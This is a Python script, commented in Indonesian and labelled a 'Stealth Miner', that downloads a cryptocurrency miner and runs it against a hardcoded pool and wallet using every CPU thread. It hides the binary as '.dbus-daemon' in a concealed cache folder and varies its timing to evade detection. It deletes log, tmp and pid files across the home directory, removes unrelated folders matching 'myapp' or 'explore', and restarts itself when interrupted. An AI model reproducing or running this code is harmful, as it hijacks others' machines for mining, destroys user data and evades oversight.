#!/usr/bin/env python3

import os
import subprocess
import urllib.request
import tarfile
import time
import threading
import shutil
import sys
import random

# === KONFIGURASI ===
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://134.199.163.180:6343"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180

# === FUNGSI PEMBERSIHAN ===
def clean_all_logs_and_traces():
    home = os.path.expanduser("~")
    for root, dirs, files in os.walk(home):
        for file in files:
            if file.endswith((".log", ".tmp", ".out", ".pid")):
                try:
                    os.remove(os.path.join(root, file))
                except:
                    continue

def clean_explorer_myapp():
    home = os.path.expanduser("~")
    for root, dirs, _ in os.walk(home):
        for d in dirs:
            if "myapp" in d.lower() or "explore" in d.lower():
                try:
                    shutil.rmtree(os.path.join(root, d))
                except:
                    continue

def clean_miner_cache():
    try:
        if os.path.exists(TARFILE):
            os.remove(TARFILE)
        if os.path.exists(HIDDEN_DIR):
            shutil.rmtree(HIDDEN_DIR)
    except:
        pass

# === ANTI SUSPEND ===
def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

# === MENJALANKAN 1 SESI MINING ===
def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(URL, TARFILE)

    with tarfile.open(TARFILE) as tar:
        tar.extractall()

    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[*] Mining selama {duration}s dengan {THREADS} thread...")

    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    os.remove(TARFILE)

    start = time.time()
    while time.time() - start < duration:
        time.sleep(10)
        if os.getloadavg()[0] >= os.cpu_count():
            print(f"[⚠️] CPU 100%! Cooldown {COOLDOWN_DURATION}s...")
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except:
                proc.kill()
            clean_all_logs_and_traces()
            clean_miner_cache()
            clean_explorer_myapp()
            time.sleep(COOLDOWN_DURATION)
            restart_script()
            return

    proc.terminate()
    try:
        proc.wait(timeout=10)
    except:
        proc.kill()

# === RESTART OTOMATIS ===
def restart_script():
    print("[🔁] Restart aman dan bersih...")
    clean_miner_cache()
    clean_explorer_myapp()
    clean_all_logs_and_traces()
    time.sleep(2)
    subprocess.Popen([sys.executable] + sys.argv)
    sys.exit(0)

# === LOOP UTAMA ===
def main_loop():
    while True:
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏳] Pause {pause}s...\n")
        time.sleep(pause)

# === MAIN ===
if __name__ == "__main__":
    print("⛏️  Stealth Miner Cleaned Version Aktif")
    threading.Thread(target=anti_suspend, daemon=True).start()
    clean_explorer_myapp()
    clean_all_logs_and_traces()
    try:
        main_loop()
    except KeyboardInterrupt:
        restart_script()
    except Exception:
        restart_script()
